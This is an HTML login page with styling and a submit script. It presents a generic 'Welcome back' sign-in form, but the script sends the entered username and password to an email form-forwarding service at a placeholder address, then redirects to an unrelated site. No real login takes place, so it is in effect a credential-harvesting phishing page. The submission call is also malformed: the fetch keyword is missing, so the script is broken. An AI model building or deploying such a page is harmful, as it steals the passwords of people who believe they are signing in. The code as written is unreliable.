<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    :root {
      --success: #10b981;
      --error: #ef4444;
      --primary: #3b82f6;
      --bg: #f3f4f6;
    }

    body { 
      font-family: system-ui, -apple-system, sans-serif; 
      background: var(--bg); 
      display: flex; 
      justify-content: center; 
      padding-top: 50px;
      margin: 0;
    }

    .card {
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    h1 { margin-top: 0; font-size: 1.5rem; }
    .lead { color: #6b7280; margin-bottom: 1.5rem; }

    label { display: block; margin-bottom: 4px; font-weight: 500; }
    
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 16px;
      display: block;
      box-sizing: border-box;
      border: 1px solid #d1d5db;
      border-radius: 4px;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background: var(--primary);
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: 600;
    }

    .btn:hover { background: #2563eb; }
    .btn:disabled { background: #94a3b8; cursor: not-allowed; }

    .message { display: none; margin-top: 1rem; padding: 1rem; border-radius: 4px; }
    
    .message.success {
      display: block;
      background: rgba(16, 185, 129, 0.1);
      border: 1px solid var(--success);
      color: #065f46;
    }

    .message.error {
      display: block;
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid var(--error);
      color: #991b1b;
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>Welcome back</h1>
    <p class="lead">Enter your credentials to access your account.</p>
    
    <form id="loginForm">
      <!-- Hidden fields for the email service -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">

      <label for="username">Username</label>
      <input type="text" id="username" name="Username_Attempt" placeholder="e.g. alex_doe" required>
      
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="••••••••" required>
      
      <button type="submit" id="submitBtn" class="btn">Sign In</button>
    </form>

    <div id="statusMessage" class="message"></div>
  </div>

<script>
  const form = document.getElementById('loginForm');
  const status = document.getElementById('statusMessage');
  const btn = document.getElementById('submitBtn');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    status.style.display = 'block';
    status.className = 'message';
    status.textContent = "Processing...";
    btn.disabled = true;

    const formData = new FormData(form);

    try {
      // 1. Submit the data (Replace YOUR_EMAIL@HERE.COM with your real email)
      await "https://formsubmit.co/your@email.com", {
        method: "POST",
        body: formData
      });

      // 2. Redirect immediately after successful submission
      status.className = 'message success';
      status.textContent = "Success! Redirecting...";
      
      window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";

    } catch (err) {
      console.error("Submission error:", err);
      status.className = 'message error';
      status.textContent = "An error occurred. Please try again.";
      btn.disabled = false;
    }
  });
</script>
